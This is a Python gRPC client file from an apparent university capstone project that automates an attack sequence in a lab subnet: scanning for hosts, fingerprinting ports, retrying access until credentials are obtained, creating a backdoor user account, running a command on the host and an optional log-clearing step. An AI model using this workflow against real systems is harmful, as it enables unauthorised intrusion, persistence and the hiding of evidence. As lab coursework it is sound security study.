# Adedotun Odutola aco0008
# Auburn University Capstone Project
# client.py

import socket 
import grpc
import attack_pb2_grpc
import attack_pb2
import time

SERVER_ADDRESS = "localhost:23229"
LOCAL_IP = '192.168.247.3'

# Function to search for a machine to target
# Input: client stub
# Output: Host IP to target 
def searchForTargetMachine(stub):
    # create a valid request message
    subnet = '192.168.247.0/24'
    request = attack_pb2.FindAMachineRequest(subnetMasks=subnet)
    # make the call
    print("Scanning for hosts up in subnet: " + subnet)
    response = stub.FindAMachine(request)

    if not response.machines:
        #No machines found in machine search. Close channel
        print("No machines up in provided subnet mask.")

    else:

        targetHost = response.machines[0]
        # Grab only the host. (i.e., everything before the colon: ex: 127.0.0.1)
        targetHost = targetHost[:targetHost.index(":")]
        if targetHost == LOCAL_IP:
            targetHost = response.machines[1]
            targetHost = targetHost[:targetHost.index(":")]   
        print("Targeting host: " + targetHost)
        return targetHost

# Function to fingerprint the machine chosen as the target.
# Input: client stub, the IP of the target host
# Output: Details found about the targeted machine.
# Future Use: Return more information pertaining to the machine besides
# just the open ports. (i.e., operating system, services, host names.)
def fingerPrintTargetMachine(stub, host):
    targetPorts = range(20,25)
    openPorts = []
    request = attack_pb2.FingerPrintMachineRequest(portsToScan=targetPorts, activeMachine=host)
    response = stub.FingerPrint(request)
    openPorts = response.port
    while not openPorts:
        print("No Open Ports found. Waiting 10 seconds and retrying.")
        request = attack_pb2.FingerPrintMachineRequest(portsToScan=targetPorts, activeMachine=host)
        response = stub.FingerPrint(request)
        openPorts = response.port
        time.sleep(10)
       
    print("Found Open ports: ", *openPorts, sep = ", ")
    return openPorts

# # Function to attempt to gain access to a vulnerable machine.
# Input: client stub, information found about the machine, IP of the host
# Output: None
def attemptToGainAccess(stub, machineInfo, targetHost): 
    request = attack_pb2.GainAccessRequest(machineInformation=machineInfo, targetHost=targetHost)
    response = stub.GainAccess(request)
    while(response.gainedAccess != True):
        print("Unable to gain access. Waiting 10 seconds and retrying.")
        time.sleep(10)
        response = stub.GainAccess(request)
    
    print("Gained access into Host:" + targetHost + " on User:" + response.user + " Password: " 
    			+ response.password + " via " + response.accessMethod)
    
    addBackDoor(stub, response.user, response.password, targetHost)
    triggerAttack(stub,response.user,response.password, targetHost)
    removeEvidence(stub)

# Function to attempt to add backdoor to target host
# Input: client stub, username and password combination, host IP
# Output: None    
# Precondition: Must have gained access in order to trigger this function
def addBackDoor(stub, username, password, targetHost):
    command="useradd defaultuser"
    request = attack_pb2.AddBackdoorRequest(backdoorCommand=command,user=username,
    						password=password,host=targetHost)
    response = stub.AddBackdoor(request)
    print(response.backdoorCommandResponse)
	
# Function to attempt to run an attack on the target host
# Input: client stub, username and password combination, host IP
# Output: None    
# Precondition: Must have gained access in order to trigger this function    
def triggerAttack(stub, username, password, targetHost):
    command = 'nmap "www.google.com"'
    request = attack_pb2.TriggerAttackRequest(attackCommand=command,user=username,
    						 password=password, host=targetHost)
    response = stub.TriggerAttack(request)   
    print(response.attackResponse)

# Function to remove any possible evidence left behind on the 
# compromised machine (i.e., to clear logs, clear commands, etc)
# Input: client stub, username and password combination, host IP
# Output: None    
# Precondition: Must have gained access in order to trigger this function
# Future use: Optional to do this depending on the attackers intent and 
# how much they are worried about being noticed. For the sake of this 
# test I did not include this.
def removeEvidence(stub):
    request = attack_pb2.ClearTracksRequest(removeLogs=False)
    response = stub.ClearTracks(request)      

# Main function initiating calls
def main():
    # open a gRPC channel
    with grpc.insecure_channel(SERVER_ADDRESS) as channel:
        # create a stub (client)
        stub = attack_pb2_grpc.AttackStub(channel)
        print('Initiating Attack Phase')
        targetHost = searchForTargetMachine(stub)
        targetInfo = fingerPrintTargetMachine(stub, targetHost)
        attemptToGainAccess(stub, targetInfo, targetHost)
        
        print("Attack Completed") 
       

if __name__ == '__main__':
    main()
